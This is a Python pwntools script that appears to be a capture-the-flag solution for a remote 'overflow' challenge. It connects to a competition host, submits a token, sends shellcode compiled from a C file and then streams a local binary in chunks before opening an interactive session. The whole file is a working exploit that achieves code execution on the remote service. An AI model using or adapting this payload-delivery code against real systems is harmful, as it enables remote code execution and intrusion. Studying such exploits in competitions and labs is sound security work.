#!/usr/bin/env python3
from pwn import *
import os

from secret import token

file_crack = './overflow'
glibc = ''
domain_name = '202.38.93.111'
port = 10106
remo = 1
archive = 'amd64'

context(os='linux', arch=archive, log_level='debug')

elf = ELF(file_crack)
if remo:
    n = remote(domain_name, port)
else:
    if glibc:
        n = elf.process(env={'LD_PRELOAD': glibc})
    else:
        n = elf.process()


def expolit():
    os.system("gcc shellcode_execveat.c -O0 -o sc")

    with open("./sc", "rb") as f:
        s = f.read()

    sc = s[s.index(b"V1me") + 4: s.index(b"V7me")]

    with open("./hello", "rb") as f1:
        hello_bin = f1.read()

    if remo:
        n.sendlineafter("Please input your token:", token)

    sleep(1)
    n.send(sc)
    sleep(3)
    i = 0
    while i < len(hello_bin):
        if len(hello_bin) - i < 400:
            n.send(hello_bin[i:])
        else:
            n.send(hello_bin[i:400+i])
        i += 400
        sleep(0.1)

    n.interactive()

if __name__ == "__main__":
    expolit()
